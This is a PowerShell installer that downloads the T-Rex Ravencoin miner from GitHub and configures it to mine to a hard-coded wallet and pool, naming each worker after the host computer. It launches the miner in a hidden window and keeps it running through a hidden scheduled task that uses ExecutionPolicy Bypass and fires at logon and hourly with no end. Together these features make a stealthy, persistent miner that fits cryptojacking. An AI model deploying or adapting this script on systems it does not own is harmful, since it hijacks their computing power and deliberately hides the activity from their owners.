# User-mode T-Rex RVN installer with hidden Scheduled Task (PS 5.1 compatible)
# Wallet: RJAht5tU4imXtDYQSh1o5EHjgwFVBbpgZR
# Pool:   stratum+tcp://us-rvn.2miners.com:6060

param(
  [string]$Wallet = "RJAht5tU4imXtDYQSh1o5EHjgwFVBbpgZR",
  [string]$Pool   = "stratum+tcp://us-rvn.2miners.com:6060"
)

$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Paths
$BaseDir   = Join-Path $env:USERPROFILE "trex"
$ExePath   = Join-Path $BaseDir "t-rex.exe"
$CfgPath   = Join-Path $BaseDir "trex.json"
$RunPS1    = Join-Path $BaseDir "run-trex.ps1"
$TaskName  = "T-Rex Miner (User)"

# 1) Ensure install dir
if (-not (Test-Path $BaseDir)) { New-Item -ItemType Directory -Path $BaseDir | Out-Null }

# 2) Download latest T-Rex for Windows
$rel   = Invoke-RestMethod "https://api.github.com/repos/trexminer/T-Rex/releases/latest"
$asset = $rel.assets | Where-Object { $_.name -match 'win.*\.zip$' } | Select-Object -First 1
if (-not $asset) { throw "Could not find a Windows zip in latest T-Rex release assets." }

$zip = Join-Path $BaseDir "trex.zip"
Invoke-WebRequest -Uri $asset.browser_download_url -OutFile $zip -UseBasicParsing
Expand-Archive -Path $zip -DestinationPath $BaseDir -Force
Remove-Item $zip -Force

# 3) Place t-rex.exe at stable path
$exe = Get-ChildItem -Path $BaseDir -Recurse -Filter "t-rex.exe" | Select-Object -First 1
if (-not $exe) { throw "t-rex.exe not found after extraction." }
if ($exe.FullName -ne $ExePath) { Copy-Item $exe.FullName -Destination $ExePath -Force }

# 4) Write config
$worker = $env:COMPUTERNAME
@{
  algo            = "kawpow"
  url             = $Pool
  user            = "$Wallet.$worker"
  pass            = "x"
  "api-bind-http" = "127.0.0.1:4067"
  quiet           = $true
  "no-color"      = $true
  "low-load"      = 1
} | ConvertTo-Json -Depth 6 | Out-File -FilePath $CfgPath -Encoding UTF8 -Force

# 5) Create launcher script
@"
`$exe = Join-Path `$env:USERPROFILE "trex\t-rex.exe"
`$cfg = Join-Path `$env:USERPROFILE "trex\trex.json"
if (-not (Test-Path `$exe)) { throw "t-rex.exe not found at `$exe" }
Start-Process -FilePath `$exe `
  -ArgumentList "--config `"`$cfg`"" `
  -WorkingDirectory (Split-Path `$exe) `
  -WindowStyle Hidden `
  -Priority BelowNormal
"@ | Out-File -FilePath $RunPS1 -Encoding UTF8 -Force

# 6) Create/replace user-level Scheduled Task (hidden, at logon + hourly, IgnoreNew)
# Trigger 1: at logon
$logonTrigger = New-ScheduledTaskTrigger -AtLogOn

# Trigger 2: "once" soon, with hourly repetition indefinitely (use a very long duration)
$startAt = (Get-Date).AddMinutes(1)
$hourlyTrigger = New-ScheduledTaskTrigger -Once -At $startAt
$hourlyTrigger.RepetitionInterval = (New-TimeSpan -Hours 1)
$hourlyTrigger.RepetitionDuration = (New-TimeSpan -Days 9999)

# Action & settings
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$RunPS1`""
$settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -MultipleInstances IgnoreNew -Hidden

# Register (replace if exists)
if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
  Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false
}
Register-ScheduledTask -TaskName $TaskName -Action $action -Trigger @($logonTrigger,$hourlyTrigger) -Settings $settings -Description "Run T-Rex RVN miner in background (user mode)"

# 7) Start it now
Start-ScheduledTask -TaskName $TaskName
Start-Sleep -Seconds 3

$proc = Get-Process -Name "t-rex" -ErrorAction SilentlyContinue | Select-Object -First 1
"`nInstalled to:  $BaseDir"
"Config:        $CfgPath"
"Task:          $TaskName (Logon + hourly, hidden)"
if ($proc) { "Status:        Running (PID $($proc.Id))" } else { "Status:        Task created; check Task Scheduler history or AV logs." }
